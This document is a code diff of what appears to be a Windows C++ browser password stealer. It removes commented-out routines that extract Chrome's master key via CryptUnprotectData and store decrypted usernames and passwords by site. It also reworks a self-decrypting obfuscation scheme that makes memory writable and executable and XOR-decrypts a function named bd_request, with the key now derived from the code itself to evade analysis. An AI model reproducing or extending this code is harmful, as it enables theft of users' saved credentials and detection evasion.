@@ -27,119 +27,6 @@ static const std::string base64_chars =
 "abcdefghijklmnopqrstuvwxyz"
 "0123456789+/";
 
-//void WriteRegistry(std::vector<tuple>* vData)
-//{
-//    HKEY hKey;
-//    LPCTSTR sk = TEXT("SOFTWARE\\tov_1");
-//    LONG retval;
-//    retval = RegCreateKeyEx(
-//        HKEY_LOCAL_MACHINE,
-//        sk,
-//        0,
-//        NULL,
-//        REG_OPTION_NON_VOLATILE,
-//        KEY_ALL_ACCESS,
-//        NULL,
-//        &hKey,
-//        NULL
-//    );
-//    if (retval != ERROR_SUCCESS)
-//    {
-//        return;
-//    }
-//    for (std::vector<tuple>::iterator it = vData->begin(); it != vData->end(); it++)
-//    {
-//        std::string str = (*it).username_value;
-//        str += " ";
-//        str += (*it).decrypted_password;
-//
-//        retval = RegSetValueEx(
-//            hKey,
-//            (*it).origin_url, 
-//            0, 
-//            REG_SZ, 
-//            (LPBYTE)str.c_str(), 
-//            str.length()
-//        );
-//        if (retval != ERROR_SUCCESS)
-//        {
-//            continue;
-//        }
-//    }
-//    retval = RegCloseKey(hKey);
-//    if (retval != ERROR_SUCCESS)
-//    {
-//        return;
-//    }
-//}
-
-//int readFile(char** pBuf, const char* pFileName)
-//{
-//    int iLen = 0;
-//
-//    FILE* F = NULL;
-//    fopen_s(&F, pFileName, "rb");
-//    if (F == NULL)
-//    {
-//        return -1;
-//    }
-//
-//    fseek(F, 0L, SEEK_END);
-//    iLen = ftell(F);
-//    fseek(F, 0L, SEEK_SET);
-//
-//    *pBuf = (char*)calloc(iLen, 1);
-//    fread(*pBuf, 1, iLen, F);
-//
-//    return (iLen);
-//}
-
-//static inline bool is_base64(unsigned char c)
-//{
-//    return (isalnum(c) || (c == '+') || (c == '/'));
-//}
-
-//std::string base64_decode(std::string const& encoded_string) {
-//    int in_len = encoded_string.size();
-//    int i = 0;
-//    int j = 0;
-//    int in_ = 0;
-//    unsigned char char_array_4[4], char_array_3[3];
-//    std::string ret;
-//
-//    while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
-//        char_array_4[i++] = encoded_string[in_]; in_++;
-//        if (i == 4) {
-//            for (i = 0; i < 4; i++)
-//                char_array_4[i] = base64_chars.find(char_array_4[i]);
-//
-//            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
-//            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
-//            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
-//
-//            for (i = 0; (i < 3); i++)
-//                ret += char_array_3[i];
-//            i = 0;
-//        }
-//    }
-//
-//    if (i) {
-//        for (j = i; j < 4; j++)
-//            char_array_4[j] = 0;
-//
-//        for (j = 0; j < 4; j++)
-//            char_array_4[j] = base64_chars.find(char_array_4[j]);
-//
-//        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
-//        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
-//        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
-//
-//        for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
-//    }
-//
-//    return ret;
-//}
-
 void aes_gcm_decrypt(const unsigned char* in_data, const int data_size, const unsigned char* gcm_key, char *result)
 {
     EVP_CIPHER_CTX* ctx;
@@ -155,26 +42,6 @@ void aes_gcm_decrypt(const unsigned char* in_data, const int data_size, const un
     EVP_CIPHER_CTX_free(ctx);
     memcpy(result, outbuf, outlen - 16);
 }
-
-//void getMasterKey(unsigned char** pKey)
-//{
-//    char* buffer = NULL;
-//    readFile(&buffer, cFileNew1);
-//    std::string data = buffer;
-//    free(buffer);
-//    std::regex key("\"encrypted_key\":\"([^\"]+)\"");
-//    std::smatch smch;
-//    std::string::const_iterator pars(data.cbegin());
-//    std::regex_search(pars, data.cend(), smch, key);
-//    std::string decoded = base64_decode(smch.str(1));
-//    decoded = decoded.substr(5);
-//    DATA_BLOB in, out;
-//    in.cbData = decoded.length();
-//    in.pbData = (BYTE*)decoded.data();
-//    CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out);
-//    (*pKey) = (unsigned char*)calloc(32, 1);
-//    memcpy(*pKey, out.pbData, 32);
-//}
 
 void bd_request(const char* f1, const char* f2)
 {
@@ -365,7 +232,7 @@ void bd_request(const char* f1, const char* f2)
 
 }
 
-#define keyTMP 0x5A // todo random key
+//#define keyTMP 0x5A // todo random key
 #define FUNC_SIZE_func 0x0F3A // size of function func() in bytes
 void getRWX(void* startAddr, void* endAddr)
 {
@@ -380,14 +247,16 @@ void getRWX(void* startAddr, void* endAddr)
     //}
 }
 
-void decryptSelf(void* address, const unsigned int size, const unsigned char key)
+void decryptSelf(void* address, const unsigned int size/*, const unsigned char key*/)
 {
     unsigned int* pJmpOffset = (unsigned int*)((unsigned char*)address + 1);
     unsigned char* pAddr = (unsigned char*)address + *pJmpOffset + 5;
+    unsigned char key = 0;
 
     getRWX(pAddr, pAddr + size);
 
-    // TODO: bruteforce
+    key = (*pAddr) ^ 0x55;
+
     for (int i = 0; i < size; i++) {
         *(pAddr + i) ^= key;
     }
@@ -401,7 +270,7 @@ void main()
     DWORD username_len = UNLEN + 1;
     std::vector<tuple> obtainedData;
 
-    decryptSelf((void*)&bd_request, FUNC_SIZE_func, keyTMP);
+    decryptSelf((void*)&bd_request, FUNC_SIZE_func);
 
     GetUserName(cUsername, &username_len);
     strcat_s(cFileFull, cFileL);
